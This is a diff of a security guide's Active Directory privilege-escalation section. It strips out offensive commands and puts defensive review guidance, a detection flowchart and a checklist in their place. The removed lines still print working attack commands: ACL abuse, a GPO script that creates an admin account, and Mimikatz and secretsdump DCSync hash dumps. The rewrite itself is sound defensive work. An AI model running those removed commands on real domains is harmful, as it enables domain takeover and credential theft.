@@ -281,55 +281,42 @@ Inventory delegation settings and their owners, review changes to delegation att
  
 
 ## Privilege Escalation Paths
-
+ 
+Excessive directory permissions can let a principal change objects, policies, group membership, or replication settings. Treat each path as a permission-review and change-monitoring problem; a graph edge identifies a possible path, not proof that it was used.
+ 
+```mermaid
+flowchart LR
+    U[Principal or service identity] -->|Effective object rights| O[User, group, GPO, or domain object]
+    O -->|Unexpected change| E[Directory and policy audit events]
+    E --> C[Correlate actor, source host,<br/>object, property, and change ticket]
+    C --> D{Authorized and expected?}
+    D -->|Yes| B[Document baseline<br/>and exception]
+    D -->|No or uncertain| I[Preserve evidence<br/>and follow response plan]
+```
+ 
 ### ACL Abuse
-
-```powershell
-# GenericAll on user → reset password / add to group
-Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force)
-Add-DomainGroupMember -Identity "Domain Admins" -Members target_user
-
-# WriteDACL on object → grant yourself GenericAll
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
-
-# ForceChangePassword right → reset password without knowing current
-$cred = New-Object System.Management.Automation.PSCredential("corp\attacker", (ConvertTo-SecureString "Attacker1!" -AsPlainText -Force))
-Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString "NewP@ss1" -AsPlainText -Force) -Credential $cred
-
-# WriteOwner → take ownership, then WriteDACL
-Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attacker
-```
-
+ 
+Review effective permissions and ownership on privileged users and groups, organizational units, domain objects, service accounts, and policy objects. Pay special attention to broad rights such as full control, permission changes, ownership changes, password-reset rights, and group-membership changes. Confirm the trustee, inheritance, scope, and business owner before changing an ACL.
+ 
 ### GPO Abuse
-
-```powershell
-# Find GPOs you can modify
-Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | 
-  Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericAll" -and 
-                $_.SecurityIdentifier -match "S-1-5-21-..."}
-
-# Use SharpGPOAbuse to add local admin or scheduled task via GPO
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Default Domain Policy"
-.\SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents "net user hacker P@ss /add && net localgroup administrators hacker /add" --GPOName "Default Domain Policy"
-```
-
+ 
+Treat Group Policy Objects as privileged software-deployment mechanisms. Review who can edit each GPO, link it to sites/domains/OUs, change delegation, and modify its SYSVOL content. Compare sensitive policy changes with an approved change record and verify the resulting scope on affected systems. Protect administrative GPOs with limited ownership and staged change review.
+ 
 ### DCSync
-
-Replicate the AD database as if you were a Domain Controller - dumps all hashes.
-
-```powershell
-# Requirements: Replicating Directory Changes + Replicating Directory Changes All permissions
-# Default holders: Domain Admins, Enterprise Admins, SYSTEM
-
-# Mimikatz DCSync
-lsadump::dcsync /domain:corp.local /user:krbtgt
-lsadump::dcsync /domain:corp.local /all /csv
-
-# Impacket (remote)
-python3 secretsdump.py 'corp.local/DA_User:Password1@DC01.corp.local'
-```
-
----
+ 
+Directory replication rights allow authorized principals and domain controllers to replicate directory data. Unexpected replication rights on domain naming contexts, or replication-like activity from an unapproved identity or host, needs urgent review. Event 4662 can provide evidence when appropriate auditing is enabled, but a rule must account for legitimate domain controllers and approved identity or backup products.
+ 
+### Defensive review checklist
+ 
+- Baseline privileged object owners, ACLs, GPO permissions, and replication rights.
+- Verify that only approved principals and domain controllers hold replication permissions.
+- Review changes to privileged groups, delegation settings, sensitive ACLs, GPOs, and AdminSDHolder.
+- Correlate event 4662 and directory-change events with the actor, source device, object, property, and change window.
+- Investigate unauthorized changes through the incident process; preserve relevant DC, endpoint, and Group Policy evidence before remediation.
+- Retest access after approved changes and keep a rollback path.
+ 
+Microsoft notes that SDProp runs every 60 minutes by default on the domain controller holding the PDC Emulator role and reapplies the AdminSDHolder descriptor to protected accounts and groups. An unexpected permission may therefore appear or be overwritten during this cycle; inspect both the template and affected objects. See Microsoft's [protected accounts and AdminSDHolder guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory), [Active Directory attack-surface reduction guidance](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/reducing-the-active-directory-attack-surface), and [delegation of control documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegation-control-wizard).
+ 
 
 ## Lateral Movement
 
